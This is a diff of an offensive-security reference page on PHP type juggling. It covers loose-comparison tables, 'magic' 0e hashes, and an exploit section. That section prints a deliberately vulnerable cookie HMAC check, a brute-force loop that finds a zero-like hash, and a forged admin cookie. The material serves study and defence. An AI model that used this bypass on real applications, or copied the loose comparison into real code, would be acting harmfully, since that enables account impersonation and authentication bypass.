@@ -1,84 +1,69 @@
-# PHP Juggling type and magic hashes
+# Type Juggling
 
-PHP provides two ways to compare two variables:
+> PHP is a loosely typed language, which means it tries to predict the programmer's intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the '==' operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).
 
-- Loose comparison using `== or !=` : both variables have "the same value".
-- Strict comparison using `=== or !==` : both variables have "the same type and the same value".
+## Summary
 
-PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.
+* [Loose Comparison](#loose-comparison)
+	* [True statements](#true-statements)
+	* [NULL statements](#null-statements)
+	* [Loose Comparison](#loose-comparison)
+* [Magic Hashes](#magic-hashes)
+* [Exploit](#exploit)
+* [References](#references)
 
-> PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. 
 
-## Type Juggling
+## Loose Comparison
+
+> PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.
+
+- **Loose** comparison: using `== or !=` : both variables have "the same value".
+- **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".
 
 ### True statements
 
-```php
-var_dump('0010e2'   == '1e3');           # true
-var_dump('0xABCdef' == ' 0xABCdef');     # true PHP 5.0 / false PHP 7.0
-var_dump('0xABCdef' == '     0xABCdef'); # true PHP 5.0 / false PHP 7.0
-var_dump('0x01'     == 1)                # true PHP 5.0 / false PHP 7.0
-var_dump('0x1234Ab' == '1193131');
-```
+| Statement                         | Output |
+| --------------------------------- |:---------------:|
+| `'0010e2'   == '1e3'`             | true |
+| `'0xABCdef' == ' 0xABCdef'`       | true (PHP 5.0) / false (PHP 7.0) |
+| `'0xABCdef' == '     0xABCdef'`   | true (PHP 5.0) / false (PHP 7.0) |
+| `'0x01'     == 1`       		    | true (PHP 5.0) / false (PHP 7.0) |
+| `'0x1234Ab' == '1193131'`         | true |
+| `'123'  == 123`                   | true |
+| `'123a' == 123`                   | true |
+| `'abc'  == 0`                     | true |
+| `'' == 0 == false == NULL`        | true |
+| `'' == 0`                         | true |
+| `0  == false `                    | true |
+| `false == NULL`                   | true |
+| `NULL == ''`                      | true |
 
-```php
-'123'  == 123
-'123a' == 123
-'abc'  == 0
-```
+> PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. 
 
-```php
-'' == 0 == false == NULL
-'' == 0       # true
-0  == false   # true
-false == NULL # true
-NULL == ''    # true
-```
+![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)
+
+Loose Type Comparisons occurs in many languages:
+* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
+* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
+* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
+* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
+* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
+* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
+* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
+* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)
+
 
 ### NULL statements
 
-```php
-var_dump(sha1([])); # NULL
-var_dump(md5([]));  # NULL
-```
+| Function | Statement                  | Output |
+| -------- | -------------------------- |:---------------:|
+| sha1     | `var_dump(sha1([]));`      | NULL |
+| md5      | `var_dump(md5([]));`       | NULL |
 
-### Example vulnerable code
 
-```php
-function validate_cookie($cookie,$key){
-	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['$expiration'], $key);
-	if($cookie['hmac'] != $hash){ // loose comparison
-		return false;
-	... 
-```
+## Magic Hashes
 
-The `$cookie` variable is provided by the user. The $key variable is a secret and unknown to the user.
-
-If we can make the calculated hash string Zero-like, and provide "0" in the `$cookie['hmac']`, the check will pass.
-
-```ps1
-"0e768261251903820937390661668547" == "0"
-```
-
-We have control over 3 elements in the cookie:
-- `$username` - username you are targeting, probably "admin"
-- `$hmac` - the provided hash, "0"
-- `$expiration` - a UNIX timestamp, must be in the future
-
-Increase the expiration timestamp enough times and we will eventually get a Zero-like calculated HMAC.
-
-```ps1
-hash_hmac(admin|1424869663) -> "e716865d1953e310498068ee39922f49"
-hash_hmac(admin|1424869664) -> "8c9a492d316efb5e358ceefe3829bde4"
-hash_hmac(admin|1424869665) -> "9f7cdbe744fc2dae1202431c7c66334b"
-hash_hmac(admin|1424869666) -> "105c0abe89825a14c471d4f0c1cc20ab"
-...
-hash_hmac(admin|1835970773) -> "0e174892301580325162390102935332" // "0e174892301580325162390102935332" == "0"
-```
-
-## Magic Hashes - Exploit
-
-If the hash computed starts with "0e" (or "0..0e") only followed by numbers, PHP will treat the hash as a float.
+>  Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations. 
 
 | Hash | "Magic" Number / String    | Magic Hash                                    | Found By / Description      |
 | ---- | -------------------------- |:---------------------------------------------:| -------------:|
@@ -102,6 +87,57 @@ var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
 var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
 ?>
 ```
+
+## Exploit
+
+The vulnerability in the following code lies in the use of a loose comparison (!=) to validate the $cookie['hmac'] against the calculated `$hash`.
+
+```php
+function validate_cookie($cookie,$key){
+	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
+	if($cookie['hmac'] != $hash){ // loose comparison
+		return false;
+		
+	}
+	else{
+		echo "Well done";
+	}
+}
+```
+
+In this case, if an attacker can control the $cookie['hmac'] value and set it to a string like "0", and somehow manipulate the hash_hmac function to return a hash that starts with "0e" followed only by numbers (which is interpreted as zero), the condition $cookie['hmac'] != $hash would evaluate to false, effectively bypassing the HMAC check.
+
+We have control over 3 elements in the cookie:
+- `$username` - username you are targeting, probably "admin"
+- `$expiration` - a UNIX timestamp, must be in the future
+- `$hmac` - the provided hash, "0"
+
+The exploitation phase is the following:
+1. Prepare a malicious cookie: The attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), `$expiration` set to a future UNIX timestamp, and $hmac set to "0".
+2. Brute force the `$expiration` value: The attacker then brute forces different `$expiration` values until the hash_hmac function generates a hash that starts with "0e" and is followed only by numbers. This is a computationally intensive process and might not be feasible depending on the system setup. However, if successful, this step would generate a "zero-like" hash.
+	```php
+	// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
+	for($i=1424869663; $i < 1835970773; $i++ ){
+		$out = hash_hmac('md5', 'admin|'.$i, '');
+		if(str_starts_with($out, '0e' )){
+			if($out == 0){
+				echo "$i - ".$out;
+				break;
+			}
+		}
+	}
+	?>
+	```
+3. Update the cookie data with the value from the bruteforce: `1539805986 - 0e772967136366835494939987377058`
+	```php
+	$cookie = [
+		'username' => 'admin',
+		'expiration' => 1539805986,
+		'hmac' => '0'
+	];
+	```
+4. In this case we assumed the key was a null string : `$key = '';`
+
 
 ## References
 
